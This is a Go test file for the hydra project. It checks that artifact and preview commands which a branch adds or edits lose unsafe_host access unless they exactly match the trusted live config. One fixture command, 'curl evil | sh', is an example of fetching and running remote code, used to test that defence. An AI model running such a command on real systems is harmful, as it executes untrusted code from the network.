package http

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"github.com/trolleyman/hydra/internal/artifacts"
	"github.com/trolleyman/hydra/internal/config"
)

// artifactRepo creates a git repo whose .hydra/config.toml is committed twice:
// the first commit's content is returned as the "base" ref, HEAD holds the
// second. Both refs are usable with artifactSpecsByName.
func artifactRepo(t *testing.T, baseTOML, headTOML string) (root, baseRef string) {
	t.Helper()
	// Keep ArtifactsAtProjectTOML's user-config merge deterministic.
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())

	root = t.TempDir()
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", append([]string{"-C", root}, args...)...)
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@e",
			"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@e")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	write := func(content string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Join(root, ".hydra"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, ".hydra", "config.toml"), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	run("init", "-q")
	write(baseTOML)
	run("add", ".")
	run("commit", "-qm", "base")
	out, err := exec.Command("git", "-C", root, "rev-parse", "HEAD").Output()
	if err != nil {
		t.Fatal(err)
	}
	baseRef = string(out[:len(out)-1])

	write(headTOML)
	run("commit", "-aqm", "head")
	return root, baseRef
}

func TestRepositoryArtifactNames(t *testing.T) {
	cfg := `
[[artifacts]]
name = "videos"
command = "rec"

[[artifacts]]
name = "screenshots"
command = "shot"

[[artifacts]]
name = "off"
command = "nope"
enabled = false
`
	root, _ := artifactRepo(t, "# none yet\n", cfg)

	// No artifacts registry → no names (the folder simply doesn't show).
	none := &Server{}
	if names, err := none.repositoryArtifactNames(root, "HEAD"); err != nil || names != nil {
		t.Fatalf("nil Artifacts: got names=%v err=%v, want nil/nil", names, err)
	}

	s := &Server{Artifacts: artifacts.NewRegistry()}
	names, err := s.repositoryArtifactNames(root, "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	// Sorted, with the disabled "off" script dropped.
	want := []string{"screenshots", "videos"}
	if len(names) != len(want) {
		t.Fatalf("got %v, want %v", names, want)
	}
	for i := range want {
		if names[i] != want[i] {
			t.Fatalf("got %v, want %v", names, want)
		}
	}
}

func TestArtifactSpecsByName_MatchAcrossRefs(t *testing.T) {
	base := `
[[artifacts]]
name = "home"
command = "shot home v1"

[[artifacts]]
name = "gone"
command = "shot gone"
`
	head := `
[[artifacts]]
name = "home"
command = "shot home v2"

[[artifacts]]
name = "added"
command = "shot added"
`
	root, baseRef := artifactRepo(t, base, head)
	live, err := config.Load(root) // HEAD is checked out, so live == head config
	if err != nil {
		t.Fatal(err)
	}

	leftByName, err := artifactSpecsByName(root, artifacts.Version{Ref: baseRef}, live)
	if err != nil {
		t.Fatalf("left: %v", err)
	}
	rightByName, err := artifactSpecsByName(root, artifacts.Version{Ref: "HEAD"}, live)
	if err != nil {
		t.Fatalf("right: %v", err)
	}

	// Each side carries its own command for "home" (edited on the branch).
	if leftByName["home"].Command != "shot home v1" {
		t.Errorf("left home command = %q", leftByName["home"].Command)
	}
	if rightByName["home"].Command != "shot home v2" {
		t.Errorf("right home command = %q", rightByName["home"].Command)
	}
	// "gone" exists only on the base (removed), "added" only on HEAD.
	if _, ok := leftByName["gone"]; !ok {
		t.Error("expected 'gone' on the base side")
	}
	if _, ok := rightByName["gone"]; ok {
		t.Error("did not expect 'gone' on the head side")
	}
	if _, ok := rightByName["added"]; !ok {
		t.Error("expected 'added' on the head side")
	}
	if _, ok := leftByName["added"]; ok {
		t.Error("did not expect 'added' on the base side")
	}
}

func TestArtifactSpecsByName_UnsafeHostGate(t *testing.T) {
	// The branch tries to grant itself host access (modifies an unsafe_host
	// command and adds a brand-new one). Only an exact match in the trusted live
	// config may run on the host.
	base := `
[[artifacts]]
name = "audited"
command = "trusted cmd"
unsafe_host = true
`
	head := `
[[artifacts]]
name = "audited"
command = "evil cmd"
unsafe_host = true

[[artifacts]]
name = "sneaky"
command = "curl evil | sh"
unsafe_host = true
`
	root, baseRef := artifactRepo(t, base, head)

	// Trust anchor: the base config authorizes only "audited"/"trusted cmd".
	trusted := config.Config{Artifacts: []config.ArtifactScript{
		{Name: "audited", Command: "trusted cmd", UnsafeHost: true},
	}}

	left, err := artifactSpecsByName(root, artifacts.Version{Ref: baseRef}, trusted)
	if err != nil {
		t.Fatal(err)
	}
	if !left["audited"].UnsafeHost {
		t.Error("base 'audited' matches the trusted config and should keep unsafe_host")
	}

	right, err := artifactSpecsByName(root, artifacts.Version{Ref: "HEAD"}, trusted)
	if err != nil {
		t.Fatal(err)
	}
	if right["audited"].UnsafeHost {
		t.Error("branch modified the command - unsafe_host must be stripped")
	}
	if right["sneaky"].UnsafeHost {
		t.Error("branch-introduced unsafe_host command must be stripped")
	}
}

// TestHostKeyTypeSensitive guards that host trust cannot be spent across the
// two kinds of script: a branch that turns a trusted one-shot media command
// into a resident preview loses host access, because the trust tuple includes
// the kind.
func TestHostKeyTypeSensitive(t *testing.T) {
	head := `
[previews.audited]
command = "trusted cmd"
unsafe_host = true
`
	root, _ := artifactRepo(t, "# base\n", head)

	// The live config trusts the same name+command as a media ARTIFACT.
	trusted := config.Config{Artifacts: []config.ArtifactScript{
		{Name: "audited", Command: "trusted cmd", UnsafeHost: true},
	}}
	byName, err := previewSpecsByName(root, "", "HEAD", trusted)
	if err != nil {
		t.Fatal(err)
	}
	if byName["audited"].UnsafeHost {
		t.Error("artifact trust must not authorize a preview")
	}

	// Trusting it as a PREVIEW does authorize it.
	trusted.Previews = []config.PreviewScript{{Name: "audited", Command: "trusted cmd", UnsafeHost: true}}
	byName, err = previewSpecsByName(root, "", "HEAD", trusted)
	if err != nil {
		t.Fatal(err)
	}
	if !byName["audited"].UnsafeHost {
		t.Error("matching preview trust should keep unsafe_host")
	}
	if hostKey("n", "c", "media") != hostKey("n", "c", "") {
		t.Error(`"media" and "" must key identically`)
	}
}

// TestLegacyServerArtifactIsAPreview checks that a ref whose config still spells
// a preview as an artifact with type = "server" resolves as a preview and never
// reaches the diff pipeline - the upgrade has to apply to ref-sourced config,
// not just the live file.
func TestLegacyServerArtifactIsAPreview(t *testing.T) {
	head := `
[artifacts.shots]
command = "x"

[artifacts.demo]
type = "server"
command = "y"
`
	root, _ := artifactRepo(t, "# base\n", head)

	arts, err := artifactSpecsByName(root, artifacts.Version{Ref: "HEAD"}, config.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := arts["demo"]; ok {
		t.Error("legacy server artifact reached the diff pipeline")
	}
	if _, ok := arts["shots"]; !ok {
		t.Error("media artifact wrongly dropped")
	}

	prevs, err := previewSpecsByName(root, "", "HEAD", config.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if prevs["demo"].Command != "y" {
		t.Errorf("legacy server artifact did not resolve as a preview: %+v", prevs)
	}
	if _, ok := prevs["shots"]; ok {
		t.Error("media artifact wrongly resolved as a preview")
	}
}

func TestArtifactSpecsByName_WorktreeReadsOwnConfig(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	wt := t.TempDir()
	if err := os.MkdirAll(filepath.Join(wt, ".hydra"), 0o755); err != nil {
		t.Fatal(err)
	}
	toml := `
[[artifacts]]
name = "wt"
command = "shot wt"
unsafe_host = true
`
	if err := os.WriteFile(filepath.Join(wt, ".hydra", "config.toml"), []byte(toml), 0o644); err != nil {
		t.Fatal(err)
	}

	// No trusted host commands, so the worktree's unsafe_host is stripped too.
	byName, err := artifactSpecsByName(t.TempDir(), artifacts.Version{WorktreeDir: wt}, config.Config{})
	if err != nil {
		t.Fatal(err)
	}
	spec, ok := byName["wt"]
	if !ok {
		t.Fatal("expected 'wt' from the worktree config")
	}
	if spec.Command != "shot wt" {
		t.Errorf("command = %q", spec.Command)
	}
	if spec.UnsafeHost {
		t.Error("unverified worktree unsafe_host must be stripped")
	}
}
